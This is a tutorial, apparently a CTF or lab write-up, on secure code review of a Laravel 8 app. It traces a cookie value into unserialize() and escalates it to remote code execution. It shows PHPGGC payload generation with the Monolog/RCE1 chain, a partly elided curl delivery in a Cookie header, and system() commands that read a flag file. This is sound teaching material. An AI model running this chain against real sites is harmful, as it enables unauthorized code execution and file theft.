# 🚀 End-to-End Secure Code Review Workflow

This demonstrates the complete methodology—from **code review** to **confirmed Remote Code Execution (RCE)**.

---

# 🗺️ Step 1: Application Recon

From previous analysis, we identified:

- 🏗️ Framework: **Laravel 8**
- 🐞 Debug Mode: Enabled (`APP_DEBUG=true`)
- 📦 Vulnerable Package: **facade/ignition**
- 📍 Attack surface mapped through routes

This provides the foundation for further review.

---

# 🔍 Step 2: Hunt for Dangerous Sinks

Use **ripgrep** to locate high-risk functions.

### Example: Search for Deserialization

```bash
rg -n "\bunserialize\s*\(" .
```

Results:

```text
Services/CacheReader.php
Http/Middleware/LoadPreferences.php
```

Each match becomes a **candidate** for manual analysis.

---

# ⚖️ Step 3: Triage Findings

Not every sink is exploitable.

## ❌ False Positive

```php
unserialize($blob, ['allowed_classes' => false]);
```

### Why?

- Object creation disabled.
- Prevents Object Injection.
- Safe deserialization.

---

## ✅ True Positive

```php
$prefs = unserialize($_COOKIE['prefs']);
```

### Why?

- Source: `$_COOKIE['prefs']`
- No class restrictions.
- User-controlled input.
- Executed on every request.

This is a valid **Object Injection** sink.

---

# 🔄 Step 4: Trace the Data Flow

```text
Attacker
   │
   ▼
Cookie: prefs
   │
   ▼
$_COOKIE['prefs']
   │
   ▼
unserialize()
   │
   ▼
PHP Object Injection
```

Since no sanitization or restrictions exist, the data flow is exploitable.

---

# 🧩 Step 5: Build a Gadget Chain

Object Injection alone is not enough.

It requires a **gadget chain** already present in the application.

Use **PHPGGC** to list available chains.

```bash
phpggc -l | grep -i monolog
```

The target contains:

- 📦 Monolog
- 💥 `Monolog/RCE1`

This chain enables **Remote Code Execution**.

---

# 📦 Step 6: Generate the Payload

Generate a serialized payload using PHPGGC.

```bash
phpggc -u Monolog/RCE1 system 'id'
```

### Why `-u`?

It URL-encodes the serialized payload.

Without encoding:

- `;` breaks cookie parsing.
- Payload becomes corrupted.

With encoding:

- Browser sends payload safely.
- PHP automatically decodes it before `unserialize()`.

---

# 📨 Step 7: Deliver the Payload

Store the payload in a variable and send it as a cookie.

```bash
PAYLOAD=$(...)

curl ... \
-H "Cookie: prefs=$PAYLOAD"
```

### Benefits

- Avoid manual copy-paste errors.
- Preserve payload integrity.
- Reliable delivery.

---

# 💥 Step 8: Confirm Code Execution

Execute a harmless command:

```bash
system('id')
```

Expected result:

```text
uid=...
```

### Why use `id`?

- Non-destructive.
- Confirms command execution.
- Demonstrates real exploitability.

At this stage, the finding moves from **theoretical** to **confirmed RCE**.

---

# 🏁 Step 9: Demonstrate Impact

Replace the proof-of-concept command with one that reads the flag.

Example:

```bash
system('cat /var/www/flag.txt')
```

Successful retrieval confirms:

- Code Execution
- File Read capability
- Full exploit chain

---

# 🔍 Vulnerability Chain

```text
Attacker
      │
      ▼
Cookie (prefs)
      │
      ▼
$_COOKIE['prefs']
      │
      ▼
unserialize()
      │
      ▼
PHP Object Injection
      │
      ▼
Monolog Gadget Chain
      │
      ▼
system()
      │
      ▼
Remote Code Execution
```

---

# 📝 Secure Code Review Process

```text
Recon
   │
   ▼
Identify Framework
   │
   ▼
Map Routes
   │
   ▼
Locate Sources
   │
   ▼
Locate Sinks
   │
   ▼
Trace Data Flow
   │
   ▼
Eliminate False Positives
   │
   ▼
Confirm True Positives
   │
   ▼
Validate Exploitability
   │
   ▼
Assess Impact
```

---

# ⚠️ Lessons Learned

- 🔍 Static analysis identifies **potential** vulnerabilities.
- ⚖️ Manual triage separates **true positives** from **false positives**.
- 📦 Safe deserialization (`allowed_classes => false`) prevents Object Injection.
- 🍪 User-controlled cookies can become dangerous deserialization sources.
- 🧩 Exploitation requires a compatible **gadget chain**.
- 💥 Confirming exploitability with a safe proof-of-concept is stronger than theoretical analysis.
- 🎯 The goal of secure code review is not just finding sinks—but proving whether they are **actually exploitable**.

---

# ✅ Key Takeaways

- 🏗️ Begin with framework and application reconnaissance.
- 🔍 Use tools like **ripgrep** to quickly locate dangerous sinks.
- ⚖️ Always distinguish **true positives** from **false positives**.
- 🔄 Trace attacker-controlled input from **Source → Sink**.
- 📦 Deserialization vulnerabilities become dangerous when paired with gadget chains.
- 🚀 Validate findings with controlled proof-of-concept exploits.
- 📝 A complete secure code review combines **static analysis, manual verification, exploit validation, and impact assessment**.
